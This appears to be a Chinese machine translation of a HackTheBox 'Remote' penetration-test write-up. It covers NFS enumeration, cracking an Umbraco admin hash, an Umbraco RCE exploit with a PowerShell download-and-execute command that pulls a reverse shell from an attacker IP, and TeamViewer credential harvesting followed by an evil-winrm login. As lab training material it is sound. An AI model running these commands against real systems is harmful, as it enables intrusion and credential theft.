<html>
<head>
<title>Remote — HackTheBox Writeup OSCP Style</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">远程——OSCP风格的黑客盒子制作</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/remote-hackthebox-writeup-oscp-style-1e35ed0f9951?source=collection_archive---------2-----------------------#2020-09-05">https://infosecwriteups.com/remote-hackthebox-writeup-oscp-style-1e35ed0f9951?source=collection_archive---------2-----------------------#2020-09-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="b46a" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Remote是一台简单难度的windows机器，上面有翁布拉科·RCE和著名的Teamviewer的CVE-2019–18988。一直想发表一篇OSCP风格的文章，花了一段时间。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/cfd754a21c2f7e3ff1e94937a78fddcd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KygBTkKsRfzJ-7du-2OIXQ.png"/></div></div></figure><p id="8cdb" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir"> Offsec的PWK示例报告</strong>:<a class="ae ln" href="https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf" rel="noopener ugc nofollow" target="_blank">https://www . offensive-security . com/pwk-online/PWK-Example-Report-v1 . pdf</a></p><p id="7a05" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我在我的OSCP考试报告中使用了上面的示例模板，这个演练也将遵循相同的模板。</p><h1 id="69a8" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated">报告-渗透</h1><p id="2824" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">评估的渗透测试部分重点关注获得对<strong class="kt ir"><em class="ml">远程</em></strong>机器的访问权。在这次渗透测试中，Preetham能够成功进入<strong class="kt ir"><em class="ml">远程</em></strong>机器。</p><p id="58a0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">被利用的漏洞:</strong> Umbraco CMS —由经过身份验证的管理员远程执行代码</p><p id="619a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">系统易受攻击:</strong> 10.10.10.180</p><p id="85bf" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">漏洞解释:</strong> Umbraco CMS在xsltVisualise功能中存在一个已验证的远程代码执行漏洞。Umbraco CMS的凭据是通过装载包含Umbraco.sdf文件的NFS共享找到的，该文件是SQL Server Compact Edition文件。</p><p id="5c99" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">【参考文献:<a class="ae ln" href="https://www.exploit-db.com/exploits/46153" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/46153</a></p><div class="mm mn gp gr mo mp"><a href="https://github.com/noraj/Umbraco-RCE" rel="noopener  ugc nofollow" target="_blank"><div class="mq ab fo"><div class="mr ab ms cl cj mt"><h2 class="bd ir gy z fp mu fr fs mv fu fw ip bi translated">诺拉吉/翁布拉科-RCE</h2><div class="mw l"><h3 class="bd b gy z fp mu fr fs mv fu fw dk translated">Umbraco CMS 7.12.4 -(已验证)远程代码执行[packet storm][WLB-2020080012]$ python exploit . py-h…</h3></div><div class="mx l"><p class="bd b dl z fp mu fr fs mv fu fw dk translated">github.com</p></div></div><div class="my l"><div class="mz l na nb nc my nd kp mp"/></div></div></a></div><p id="b45f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">权限提升漏洞:</strong>Teamviewer CVE-2019–18988从注册表收集凭据。</p><p id="0fba" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">参考</strong>:<a class="ae ln" href="https://whynotsecurity.com/blog/teamviewer/" rel="noopener ugc nofollow" target="_blank">https://whynotsecurity.com/blog/teamviewer/</a></p><p id="b06d" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">漏洞修复</strong>:将Teamviewer更新至最新版本</p><p id="f609" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">严重性:</strong>危急</p><h1 id="d619" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated"><strong class="ak">信息收集</strong></h1><h2 id="94bb" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated"><strong class="ak">完整Nmap扫描</strong></h2><pre class="kg kh ki kj gt nq nr ns nt aw nu bi"><span id="b60d" class="ne lp iq nr b gy nv nw l nx ny">Nmap scan report for 10.10.10.180<br/>Host is up (0.74s latency).</span><span id="a590" class="ne lp iq nr b gy nz nw l nx ny">PORT     STATE SERVICE       VERSION<br/>21/tcp   open  ftp           Microsoft ftpd<br/>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>| ftp-syst: <br/>|_  SYST: Windows_NT<br/>80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-title: Home - Acme Widgets<br/>111/tcp  open  rpcbind       2-4 (RPC #100000)<br/>| rpcinfo: <br/>|   program version    port/proto  service<br/>|   100000  2,3,4        111/tcp   rpcbind<br/>|   100000  2,3,4        111/tcp6  rpcbind<br/>|   100000  2,3,4        111/udp   rpcbind<br/>|   100000  2,3,4        111/udp6  rpcbind<br/>|   100003  2,3         2049/udp   nfs<br/>|   100003  2,3         2049/udp6  nfs<br/>|   100003  2,3,4       2049/tcp   nfs<br/>|   100003  2,3,4       2049/tcp6  nfs<br/>|   100005  1,2,3       2049/tcp   mountd<br/>|   100005  1,2,3       2049/tcp6  mountd<br/>|   100005  1,2,3       2049/udp   mountd<br/>|   100005  1,2,3       2049/udp6  mountd<br/>|   100021  1,2,3,4     2049/tcp   nlockmgr<br/>|   100021  1,2,3,4     2049/tcp6  nlockmgr<br/>|   100021  1,2,3,4     2049/udp   nlockmgr<br/>|   100021  1,2,3,4     2049/udp6  nlockmgr<br/>|   100024  1           2049/tcp   status<br/>|   100024  1           2049/tcp6  status<br/>|   100024  1           2049/udp   status<br/>|_  100024  1           2049/udp6  status<br/>135/tcp  open  msrpc         Microsoft Windows RPC<br/>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br/>445/tcp  open  microsoft-ds?<br/>2049/tcp open  mountd        1-3 (RPC #100005)<br/>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></pre><p id="4f20" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">有允许匿名访问的FTP和Web服务器，RPC，SMB和NFS端口开放。Preetham找到了NFS与<code class="fe oa ob oc nr b">showmount</code>的共享出口列表，并挂载了<code class="fe oa ob oc nr b">site_backups</code>共享。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi od"><img src="../Images/b749d46b85cc0bacf4c87e08cabcffa1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wzA5Ius5tmNpBpAsPNjx3g.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oe"><img src="../Images/1f808651bdda7f4115fd6aaab42f5bfe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rCqbcM_rjUv7vp4ao5cLRw.png"/></div></div></figure><p id="a4e6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir"> Umbraco.sdf文件</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi of"><img src="../Images/761a2c5bc232383eafb29baa600daee0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*22Da7QSXTIc6G7_c7XOrtQ.png"/></div></div></figure><pre class="kg kh ki kj gt nq nr ns nt aw nu bi"><span id="adcd" class="ne lp iq nr b gy nv nw l nx ny">root@kali:~/htb/boxes/remote# strings Umbraco.sdf | grep admin                                                                                               Administratoradmindefaulten-US                                                                                                                               <br/>Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d                                                                                           <br/>Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d<br/>adminadmin@htb.local<strong class="nr ir"><em class="ml">b8be16afba8c314ad33d812f22a04991b90e2aaa</em></strong>{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50<br/>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f<br/>User "admin" &lt;admin@htb.local&gt;192.168.195.1User "admin" &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span></pre><p id="607d" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Preetham获得了SHA1类型的admin账户hash<strong class="kt ir"><em class="ml">(b 8 be 16 afba 8 c 314 ad 33d 812 f 22 a 04991 b 90 e 2 AAA)</em></strong>。</p><h2 id="ef6b" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated">破解哈希</h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi og"><img src="../Images/e4cd96eb79f062b263652096976f3876.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7f0F4f6D74QxzvrS0tF1DA.png"/></div></div></figure><p id="5eaf" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">普雷瑟姆以<code class="fe oa ob oc nr b"><strong class="kt ir"><em class="ml">baconandcheese</em></strong></code>的身份获得了密码</p><h2 id="a7f6" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated">远程代码执行</h2><p id="3e10" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated"><strong class="kt ir">参考</strong>:【https://github.com/noraj/Umbraco-RCE】T2</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oh"><img src="../Images/2066409492a7129548254f5ded169bad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fnKdXLCwj5PWhOmSDMu7Ig.png"/></div></div></figure><h2 id="bb3c" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated">反向外壳</h2><p id="b715" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">Preetham使用h<a class="ae ln" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" rel="noopener ugc nofollow" target="_blank">ttps://github . com/samratashok/nishang/blob/master/shell/Invoke-powershelltcp . PS1</a>获得了一个反向shell。</p><p id="6516" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">命令</strong></p><pre class="kg kh ki kj gt nq nr ns nt aw nu bi"><span id="8908" class="ne lp iq nr b gy nv nw l nx ny">python3 exploit.py -u ‘admin@htb.local’ -p ‘baconandcheese’ -i ‘<a class="ae ln" href="http://10.10.10.180'" rel="noopener ugc nofollow" target="_blank">http://10.10.10.180'</a> -c powershell.exe -a “IEX(New<br/>-Object System.Net.WebClient).DownloadString(‘<a class="ae ln" href="http://10.10.14.42/shell.ps1'" rel="noopener ugc nofollow" target="_blank">http://10.10.14.42/shell.ps1'</a>)"</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oi"><img src="../Images/a782038efe1c405287d4362de044eac3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vljnKnqx9gKbrWFUEeGzTg.png"/></div></div></figure><h2 id="4899" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated">User.txt和IP地址</h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oj"><img src="../Images/cf4dfd48287c850af6c059e9fa5915e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BM9HuFOJVohBZT7rLRkfHg.png"/></div></div></figure><h2 id="0132" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated">权限提升:Teamviewer CVE-2019–18988从注册中心收集凭据</h2><p id="de32" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated"><strong class="kt ir">参考</strong>:<a class="ae ln" href="https://whynotsecurity.com/blog/teamviewer/" rel="noopener ugc nofollow" target="_blank">https://whynotsecurity.com/blog/teamviewer/</a></p><p id="f419" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Preetham在枚举时发现计算机上安装了Teamviewer。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ok"><img src="../Images/a1a7f2c8d1f6dfa2a7f12d4610fb3324.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r46P4mkuC1Fin-geRA02xQ.png"/></div></div></figure><p id="dd69" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Preetham通过执行以下操作发现Teamviewer的版本是7。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ol"><img src="../Images/dfccc11d09af2533c18c0a17e6bd46f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eZpKE7WUAB1KkLva1w9mPA.png"/></div></div></figure><p id="e17a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Preetham通过在机器上执行msfvenom创建的恶意二进制文件获得了一个meterpreter外壳。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/f9686916ea70b18d677a6faa7634c003.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eZQl4VI2gHdvVAAARbHUmw.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi on"><img src="../Images/d656f3b558d8f0b9e71e9d98039c539b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1dwa4b9Ng_E4fKI4F9l15A.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oo"><img src="../Images/057b24c9a0aec7452e8242ab8ceed58f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cx7V_OLhXQItPqn0od68vg.png"/></div></div></figure><p id="a38b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Preetham运行Teamviewer MSF模块，找到管理员的密码并使用WinRM登录。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi op"><img src="../Images/aaf1b43e1ddcc9edda7a01a64e2f8424.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a27mqkOM8f1xkanC4CZvUw.png"/></div></div></figure><blockquote class="oq or os"><p id="4181" class="kr ks ml kt b ku kv jr kw kx ky ju kz ot lb lc ld ou lf lg lh ov lj lk ll lm ij bi translated"><strong class="kt ir">命令</strong>:evil-winrm-I 10 . 10 . 10 . 180-u administrator-p '！' R3m0te！'</p></blockquote><h2 id="a3f7" class="ne lp iq bd lq nf ng dn lu nh ni dp ly la nj nk ma le nl nm mc li nn no me np bi translated">Root.txt和ipconfig</h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ow"><img src="../Images/60141b6f1403b7d822dc09453e80a848.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Fug8A1GcsGeu1NLxal25Cw.png"/></div></div></figure></div></div>    
</body>
</html>